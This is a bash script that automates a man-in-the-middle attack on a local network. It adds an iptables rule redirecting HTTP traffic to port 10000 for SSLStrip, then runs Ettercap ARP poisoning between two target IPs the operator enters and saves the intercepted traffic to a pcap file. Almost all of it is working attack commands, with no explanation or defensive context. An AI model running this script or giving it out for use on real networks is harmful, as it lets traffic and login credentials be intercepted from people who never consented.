#! /bin/bash
# start Ettercap text
 
echo first configuring IP tables…
echo Enter interface for IP tables i.e. eth0, wlan0 etc
read -p 'Interface: ' intvar
iptables -A PREROUTING -t nat -i $intvar -p tcp --dport 80 -j REDIRECT --to-port 10000
echo Which interface to use for ettercap i.e. eth0, wlan0 etc
read -p 'Interface: ' intervar
read -r -p "Are you ready to start Ettercap, has SSLStrip been started and you want arp remote function? [y/N] " response
if [[ $response =~ ^([yY][eE][sS]|[yY])$ ]]
then
	echo Enter filename
	read -p 'Filename: ' filevar
	echo Enter Target 1 IP
	read -p 'Target 1 IP: ' routervar
	echo Enter Target 2 IP - if required
	read -p 'Target 2 IP: ' targetvar
	ettercap -T -i $intervar -M arp:remote -w /root/etterlog/$filevar.pcap /$routervar//$targetvar/
else
    	echo Enter filename
 	read -p 'Filename: ' filevar
	echo Enter Target 1 IP
	read -p 'Target 1 IP: ' routervar
	echo Enter Target 2 IP - if required
	read -p 'Target 2 IP: ' targetvar
	ettercap -T -i $intervar -M arp -w /root/etterlog/$filevar.pcap /$routervar//$targetvar/
echo finished
fi
